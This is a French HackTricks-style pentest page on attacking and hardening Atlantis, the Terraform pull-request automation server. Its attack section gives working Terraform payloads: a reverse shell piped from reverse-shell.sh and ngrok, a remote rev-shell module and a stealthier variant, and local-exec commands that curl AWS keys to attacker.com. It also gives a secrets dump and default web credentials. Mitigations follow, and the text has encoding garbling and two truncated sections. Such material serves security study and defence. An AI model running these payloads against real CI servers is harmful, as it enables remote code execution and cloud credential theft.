# S√©curit√© d'Atlantis

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFT exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

</details>

## Informations de base

Atlantis vous aide √† ex√©cuter Terraform √† partir de Pull Requests de votre serveur git.

![](<../.gitbook/assets/image (51).png>)

## Laboratoire local

1. Allez sur la page des **versions d'Atlantis** √† l'adresse [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) et **t√©l√©chargez** celle qui vous convient.
2. Cr√©ez un **jeton personnel** (avec acc√®s au d√©p√¥t) de votre utilisateur **github**
3. Ex√©cutez `./atlantis testdrive` et il cr√©era un **d√©p√¥t de d√©monstration** que vous pouvez utiliser pour **communiquer avec Atlantis**
   1. Vous pouvez acc√©der √† la page web √† l'adresse 127.0.0.1:4141

## Acc√®s √† Atlantis

### Identifiants du serveur Git

Atlantis prend en charge plusieurs h√¥tes git tels que **Github**, **Gitlab**, **Bitbucket** et **Azure DevOps**.\
Cependant, pour acc√©der aux d√©p√¥ts de ces plateformes et effectuer des actions, il doit disposer de certains **acc√®s privil√©gi√©s** (au moins des autorisations d'√©criture).\
[**La documentation**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) encourage √† cr√©er un utilisateur dans ces plateformes sp√©cifiquement pour Atlantis, mais certaines personnes peuvent utiliser des comptes personnels.

{% hint style="warning" %}
Dans tous les cas, du point de vue d'un attaquant, le **compte Atlantis** sera tr√®s **int√©ressant √† compromettre**.
{% endhint %}

### Webhooks

Atlantis utilise facultativement des [**secrets de webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) pour valider que les **webhooks** qu'il re√ßoit de votre h√¥te Git sont **l√©gitimes**.

Une fa√ßon de confirmer cela serait de **autoriser les demandes √† venir uniquement des adresses IP** de votre h√¥te Git, mais une fa√ßon plus facile est d'utiliser un secret de webhook.

Notez que sauf si vous utilisez un serveur github ou bitbucket priv√©, vous devrez exposer les points de terminaison de webhook √† Internet.

{% hint style="warning" %}
Atlantis va **exposer des webhooks** pour que le serveur git puisse lui envoyer des informations. Du point de vue d'un attaquant, il serait int√©ressant de savoir **si vous pouvez lui envoyer des messages**.
{% endhint %}

### Identifiants du fournisseur <a href="#provider-credentials" id="provider-credentials"></a>

Atlantis ex√©cute Terraform en ex√©cutant simplement les commandes `terraform plan` et `apply` sur le serveur **sur lequel Atlantis est h√©berg√©**. Tout comme lorsque vous ex√©cutez Terraform localement, Atlantis a besoin d'informations d'identification pour votre fournisseur sp√©cifique.

Il vous appartient de [fournir des informations d'identification](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) pour votre fournisseur sp√©cifique √† Atlantis :

* Le [charte Helm](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) d'Atlantis et le [module AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) ont leurs propres m√©canismes pour les informations d'identification du fournisseur. Lisez leur documentation.
* Si vous ex√©cutez Atlantis dans un cloud, de nombreux clouds ont des moyens de donner acc√®s √† l'API cloud aux applications qui y sont ex√©cut√©es, par exemple :
  * [R√¥les AWS EC2](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (recherchez "EC2 Role")
  * [Comptes de service d'instance GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* De nombreux utilisateurs d√©finissent des variables d'environnement, par exemple `AWS_ACCESS_KEY`, l√† o√π Atlantis est en cours d'ex√©cution.
* D'autres cr√©ent les fichiers de configuration n√©cessaires, par exemple `~/.aws/credentials`, l√† o√π Atlantis est en cours d'ex√©cution.
* Utilisez le [fournisseur HashiCorp Vault](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) pour obtenir des informations d'identification du fournisseur.

{% hint style="warning" %}
Le **conteneur** o√π **Atlantis** est **ex√©cut√©** contiendra tr√®s probablement des informations d'identification **privil√©gi√©es** pour les fournisseurs (AWS, GCP, Github...) que Atlantis g√®re via Terraform.
{% endhint %}

### Page Web

Par d√©faut, Atlantis ex√©cutera une **page web sur le port 4141 en localhost**. Cette page vous permet simplement d'activer/d√©sactiver l'application d'atlantis et de v√©rifier l'√©tat du plan des d√©p√¥ts et de les d√©verrouiller (elle ne permet pas de modifier les choses, donc elle n'est pas tr√®s utile).

Vous ne la trouverez probablement pas expos√©e sur Internet, mais il semble que par d√©faut, **aucun identifiant** ne soit n√©cessaire pour y acc√©der (et si c'est le cas, `atlantis`:`atlantis` sont les **identifiants** par **d√©faut**).

## Configuration du serveur

La configuration du serveur Atlantis peut √™tre sp√©cifi√©e via des indicateurs de ligne de commande, des variables d'environnement, un fichier de configuration ou une combinaison des trois.

* Vous pouvez trouver [**ici la liste des indicateurs**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) pris en charge par le serveur Atlantis
* Vous pouvez trouver [**ici comment transformer une option de configuration en une variable d'environnement**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Les valeurs sont **choisies dans cet ordre
## Commandes Atlantis

[**Dans la documentation**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis), vous pouvez trouver les options que vous pouvez utiliser pour ex√©cuter Atlantis :

```bash
# Obtenir de l'aide
atlantis help

# Ex√©cuter terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## Vous pouvez √©galement ajouter des options terraform suppl√©mentaires

# Ex√©cuter terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## Vous pouvez √©galement ajouter des options terraform suppl√©mentaires 
```

## Attaques

{% hint style="warning" %}
Si lors de l'exploitation, vous trouvez cette **erreur** : `Error: Error acquiring the state lock`

Vous pouvez la corriger en ex√©cutant :

```
atlantis unlock #Vous devrez peut-√™tre ex√©cuter ceci dans une autre PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Modification de la configuration dans une nouvelle PR

Si vous avez un acc√®s en √©criture sur un r√©f√©rentiel, vous pourrez cr√©er une nouvelle branche et g√©n√©rer une PR. Si vous pouvez **ex√©cuter `atlantis plan`** (ou peut-√™tre qu'il est ex√©cut√© automatiquement) **vous pourrez ex√©cuter une RCE √† l'int√©rieur du serveur Atlantis**.

Vous pouvez faire cela en faisant [**charger Atlantis une source de donn√©es externe**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Il suffit de mettre une charge utile comme celle-ci dans le fichier `main.tf` :

```json
data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### Attaque plus discr√®te

Vous pouvez effectuer cette attaque de mani√®re encore plus discr√®te, en suivant ces suggestions :

* Au lieu d'ajouter directement la coquille r√©versible dans le fichier terraform, vous pouvez **charger une ressource externe** qui contient la coquille r√©versible :

```javascript
module "not_rev_shell" {
  source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

Vous pouvez trouver le code de la coquille r√©versible dans [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Dans la ressource externe, utilisez la fonction **ref** pour masquer le **code de la coquille r√©versible terraform dans une branche** √† l'int√©rieur du r√©f√©rentiel, quelque chose comme : `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Au lieu** de cr√©er une **PR vers master** pour d√©clencher Atlantis, **cr√©ez 2 branches** (test1 et test2) et cr√©ez une **PR de l'une √† l'autre**. Lorsque vous avez termin√© l'attaque, **supprimez simplement la PR et les branches**.

### Atlantis plan Secrets Dump

Vous pouvez **dumper les secrets utilis√©s par terraform** en ex√©cutant `atlantis plan` (`terraform plan`) en mettant quelque chose comme ceci dans le fichier terraform :

```json
output "dotoken" {
  value = nonsensitive(var.do_token)
}
```

### Atlantis apply RCE - Modification de la configuration dans une nouvelle PR

Si vous avez un acc√®s en √©criture sur un r√©f√©rentiel, vous pourrez cr√©er une nouvelle branche et g√©n√©rer une PR. Si vous pouvez **ex√©cuter `atlantis apply` vous pourrez ex√©cuter une RCE √† l'int√©rieur du serveur Atlantis**.

Cependant, vous devrez g√©n√©ralement contourner certaines protections :

* **Fusionnable** : Si cette protection est d√©finie dans Atlantis, vous ne pouvez ex√©cuter **`atlantis apply` que si la PR est fusionnable** (ce qui signifie que la protection de la branche doit √™tre contourn√©e).
  * V√©rifiez les √©ventuelles [**contournements de protection de branche**](broken-reference/)
* **Approuv√©** : Si cette protection est d√©finie dans Atlantis, un **autre utilisateur doit approuver la PR** avant que vous puissiez ex√©cuter `atlantis apply`
  * Par d√©faut, vous pouvez abuser du [**jeton Gitbot pour contourner cette protection**](broken-reference/)

Ex√©cution de **`terraform apply` sur un fichier Terraform malveillant avec** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Il vous suffit de vous assurer qu'une charge utile comme les suivantes se termine dans le fichier `main.tf` :

```json
// Payload 1 pour voler un secret
resource "null_resource" "secret_stealer" {
  provisioner "local-exec" {
    command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
  }
}

// Payload 2 pour obtenir une coquille r√©versible
resource "null_resource" "rev_shell" {
  provisioner "local-exec" {
    command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
  }
}
```

Suivez les **suggestions de la technique pr√©c√©dente** pour effectuer cette attaque de mani√®re **plus discr√®te**.

### Injection de param√®tres Terraform

Lorsque vous ex√©cutez `atlantis plan` ou `atlantis apply`, terraform est ex√©cut√© en dessous, vous pouvez transmettre des commandes √† terraform depuis atlantis en commentant quelque chose comme :

```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Obtenir de l'aide sur terraform plan

atlantis apply -- <terraform commands>
atlantis apply -- -h #Obtenir de l'aide sur terraform apply
```

Vous pouvez transmettre des variables d'environnement qui pourraient √™tre utiles pour contourner certaines protections. V√©rifiez les variables d'environnement terraform dans [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Workflow personnalis√©

Ex√©cution de **commandes de construction personnalis√©es malveillantes** sp√©cifi√©es dans un fichier `atlantis.yaml`. Atlantis utilise le fichier `atlantis.yaml` de la branche de la demande de tirage, **pas** de `master`.\
Cette possibilit√© a √©t√© mentionn√©e dans une section pr√©c√©dente :

{% hint style="danger" %}
Si le drapeau de [**configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est d√©fini sur **True**, les workflows peuvent √™tre **sp√©cifi√©s** dans le fichier **`atlantis.yaml`** de chaque r√©f√©rentiel. Il est √©galement potentiellement n√©cessaire que **`allowed_overrides`** sp√©cifie √©galement **`workflow`** pour **remplacer le workflow** qui va √™tre utilis√©.

Cela donnera essentiellement **RCE dans le serveur Atlantis √† tout utilisateur qui peut acc√©der √† ce r√©f√©rentiel**.

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
  workflow: custom1
workflows:
  custom1:
    plan:
      steps:
      - init
      - run: my custom plan command
    apply:
      steps:
      - run: my custom apply command
```
{% endhint %}

### Contournement des protections de plan/apply

Si le drapeau de [**configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _a_ `
## Mesures d'att√©nuation

### Ne pas utiliser sur des d√©p√¥ts publics <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

√âtant donn√© que n'importe qui peut commenter les pull requests publics, m√™me avec toutes les mesures d'att√©nuation disponibles, il est toujours dangereux d'ex√©cuter Atlantis sur des d√©p√¥ts publics sans une configuration appropri√©e des param√®tres de s√©curit√©.

### Ne pas utiliser `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Si vous utilisez un d√©p√¥t public (ce qui n'est pas recommand√©, voir ci-dessus), vous ne devez pas d√©finir `--allow-fork-prs` (par d√©faut √† false) car n'importe qui peut ouvrir une pull request depuis son fork vers votre d√©p√¥t.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis vous oblige √† sp√©cifier une liste blanche de d√©p√¥ts √† partir desquels il acceptera les webhooks via le drapeau `--repo-allowlist`. Par exemple :

* D√©p√¥ts sp√©cifiques : `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Toute votre organisation : `--repo-allowlist=github.com/runatlantis/*`
* Tous les d√©p√¥ts de votre installation GitHub Enterprise : `--repo-allowlist=github.yourcompany.com/*`
* Tous les d√©p√¥ts : `--repo-allowlist=*`. Utile lorsque vous √™tes dans un r√©seau prot√©g√© mais dangereux sans d√©finir √©galement un secret de webhook.

Ce drapeau garantit que votre installation d'Atlantis n'est pas utilis√©e avec des d√©p√¥ts que vous ne contr√¥lez pas. Consultez `atlantis server --help` pour plus de d√©tails.

### Prot√©ger la planification Terraform <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Si les attaquants soumettent des pull requests avec du code Terraform malveillant dans votre mod√®le de menace, vous devez savoir que les approbations `terraform apply` ne suffisent pas. Il est possible d'ex√©cuter du code malveillant dans un `terraform plan` en utilisant la source de donn√©es [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ou en sp√©cifiant un fournisseur malveillant. Ce code pourrait ensuite exfiltrer vos informations d'identification.

Pour √©viter cela, vous pouvez :

1. Int√©grer les fournisseurs dans l'image Atlantis ou l'h√¥te et refuser la sortie en production.
2. Mettre en ≈ìuvre le protocole de registre de fournisseurs en interne et refuser la sortie publique, de cette fa√ßon vous contr√¥lez qui a un acc√®s en √©criture au registre.
3. Modifier l'√©tape `plan` de la configuration du d√©p√¥t c√¥t√© serveur pour valider l'utilisation de fournisseurs ou de sources de donn√©es interdits ou les PR des utilisateurs non autoris√©s. Vous pouvez √©galement ajouter une validation suppl√©mentaire √† ce stade, par exemple en exigeant un "thumbs-up" sur la PR avant de permettre la poursuite du `plan`. Conftest pourrait √™tre utile ici.

### Secrets de webhook <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis doit √™tre ex√©cut√© avec des secrets de webhook d√©finis via les variables d'environnement `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. M√™me avec le drapeau `--repo-allowlist` d√©fini, sans secret de webhook, les attaquants pourraient faire des demandes √† Atlantis en se faisant passer pour un d√©p√¥t qui est sur la liste blanche. Les secrets de webhook garantissent que les demandes de webhook proviennent r√©ellement de votre fournisseur de VCS (GitHub ou GitLab).

Si vous utilisez Azure DevOps, au lieu de secrets de webhook, ajoutez un nom d'utilisateur et un mot de passe de base.

### Authentification de base Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps prend en charge l'envoi d'un en-t√™te d'authentification de base dans tous les √©v√©nements de webhook. Cela n√©cessite l'utilisation d'une URL HTTPS pour l'emplacement de votre webhook.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Si vous utilisez des secrets de webhook mais que votre trafic est en HTTP, les secrets de webhook pourraient √™tre vol√©s. Activez SSL/HTTPS en utilisant les drapeaux `--ssl-cert-file` et `--ssl-key-file`.

### Activer l'authentification sur le serveur Web Atlantis <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Il est fortement recommand√© d'activer l'authentification dans le service Web. Activez BasicAuth en utilisant `--web-basic-auth=true` et configurez un nom d'utilisateur et un mot de passe en utilisant les drapeaux `--web-username=yourUsername` et `--web-password=yourPassword`.

Vous pouvez √©galement passer ces variables d'environnement `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` et `ATLANTIS_WEB_PASSWORD=yourPassword`.

## R√©f√©rences

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous voulez voir votre **entreprise annonc√©e dans HackTricks** ou si vous voulez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>